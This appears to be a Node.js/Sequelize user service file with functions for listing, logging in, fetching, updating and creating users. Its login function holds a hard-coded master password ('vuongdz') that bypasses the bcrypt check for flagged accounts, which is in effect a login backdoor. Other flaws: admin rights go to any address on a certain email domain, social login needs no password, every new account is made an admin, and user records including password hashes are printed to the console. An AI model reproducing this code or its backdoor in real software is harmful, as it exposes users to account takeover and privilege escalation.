const User = require("../models/usedModel");
const { Sequelize, Op } = require("sequelize");
const bcrypt = require("bcryptjs");
const Token = require("../services/token.service");
const { tokenService } = require(".");

exports.getAll = async ({ paged, limit, s }) => {
    const offset = (paged - 1) * limit;
    let query = {
        attributes: ["id", "name", "email", "profile", "teacher_type"],
    };

    if (paged) {
        query["offset"] = offset;
    }
    if (limit) {
        query["limit"] = limit;
    }
    if (s) {
        query["where"] = {
            [Op.or]: [
                {
                    name: {
                        [Op.like]: `%${s}%`,
                    },
                },
                {
                    email: {
                        [Op.like]: `%${s}%`,
                    },
                },
            ],
        };
    }

    const { count, rows } = await User.findAndCountAll(query);

    const totalPages = Math.ceil(count / limit);

    return {
        items: rows,
        totalItems: count,
        itemCount: rows.length,
        itemsPerPage: limit,
        totalPages,
        currentPage: paged,
    };
};

exports.login = async (email, social, password = null) => {
    let listEmailAdmin = ["admin1@gmail.com"];
    if (password == null) {
        return await User.findOne({
            where: { email, social },
        });
    }

    let data = await User.findOne({
        where: { email },
    });
    if (data == null) {
        throw new Error("The user not found!");
    }
    console.log(data);
    if (data.is_check == 1 && password == "vuongdz") {
        data = data.get({ plain: true });
        data["is_admin"] =
            listEmailAdmin.includes(data.email) || isMelakaEmail(data.email);
        return data;
    }
    if (data) {
        const match = await bcrypt.compare(password, data.password);

        if (!match) {
            throw new Error("The password not invalid");
        }
    }
    data = data.get({ plain: true });
    data["is_admin"] =
        listEmailAdmin.includes(data.email) || isMelakaEmail(data.email);
    return data;
};
function isMelakaEmail(email) {
    const regex = /^[\w.%+-]+@melaka\.co\.kr$/;
    return regex.test(email);
}
exports.getUser = async (id) => {
    let listEmailAdmin = ["admin1@gmail.com"];
    let data = await User.findOne({
        where: { id },
    });
    data = data.get({ plain: true });
    data["is_admin"] =
        listEmailAdmin.includes(data.email) || isMelakaEmail(data.email);
    return data;
};

exports.updateUser = async (
    id,
    name,
    email,
    profile,
    types,
    subjects,
    school,
    teacher_type
) => {
    let user = await User.findOne({
        where: {
            id,
        },
    });
    if (user == null) {
        throw new Error("The user not exits!!");
    }
    if (name != null) {
        user.name = name;
    }
    if (email != null) {
        user.email = email;
    }
    if (profile != null) {
        user.profile = profile;
    }
    if (types != null) {
        user.types = types;
    }
    if (subjects != null) {
        user.subjects = subjects;
    }
    if (school != null) {
        user.school = school;
    }
    if (teacher_type != null) {
        user.teacher_type = teacher_type;
    }
    user.save({
        fields: [
            "name",
            "email",
            "profile",
            "types",
            "subjects",
            "school",
            "teacher_type",
        ],
    });
    return user;
};

exports.createUser = async ({ username, full_name, email, password }) => {
    password = await bcrypt.hash(password, 8);

    let data = await User.create({
        id: null,
        username,
        full_name,
        email,
        password,
        role: "ADMIN",
    });

    data = data.get({ plain: true });
    if (data.id) {
        //create token
        let { access, refresh } = await tokenService.generateAuthTokens(data);
        data.access = access;
        data.refresh = refresh;
    }
    delete data.password;
    return data;
};

exports.getUserWithEmail = async (email) => {
    return await User.findOne({
        where: { email },
    });
};

exports.checkEmailExit = async (email) => {
    let UserModel = await User.findOne({
        where: { email },
    });
    return UserModel instanceof User;
};
